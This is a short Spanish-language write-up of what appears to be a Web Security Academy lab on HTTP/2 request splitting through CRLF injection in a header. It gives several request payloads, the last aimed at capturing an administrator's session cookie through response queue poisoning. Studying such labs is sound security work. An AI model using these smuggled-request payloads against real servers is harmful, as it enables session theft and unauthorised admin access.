---
title: "14 -HTTP2 request splitting via CRLF injection"
---

# 14 -HTTP2 request splitting via CRLF injection

Vamos a meter una request dentro de una cabecera metiendo CRLFs
Esto lo hacemos con el objetivo de hacer response queue poisoining.

El problema es que el frontend sobreescribe la petición para añadirle una cabecera Host personalizada, por lo que la primera petición no tendrá cabecera Host y la segunda tendrá 2 :

```HTTP
:method	GET
:path	/
:authority	vulnerable-website.com
:foo	bar{\r\n}
{\r\n}
GET /admin HTTP/1.1{\r\n}
Host: vulnerable-website.com
```

Así cada petición tendrá cabecera host : 

```HTTP
:method	GET
:path	/
:authority	vulnerable-website.com
:foo	bar{\r\n}
Host: vulnerable-website.com{\r\n}
{\r\n}
GET /admin HTTP/1.1
```


Esto puede funcionar : 

```HTTP
GET /404 HTTP/2
Host: 0aa2006804d362d78012e4e500d200a4.web-security-academy.net
Foo: bar{\r\n}Host: 0aa2006804d362d78012e4e500d200a4.web-security-academy.net{\r\n}{\r\n}GET /404 HTTP/1.1
```

La cosa es que es el admin el que está navegando por la web, queremos que el admin entre al panel de /admin para que nos tire un 302 con la cookie, no que haga un 404 :

```HTTP
GET /404 HTTP/2
Host: 0aa2006804d362d78012e4e500d200a4.web-security-academy.net
Foo: bar{\r\n}Host: 0aa2006804d362d78012e4e500d200a4.web-security-academy.net{\r\n}{\r\n}GET /admin HTTP/1.1
```
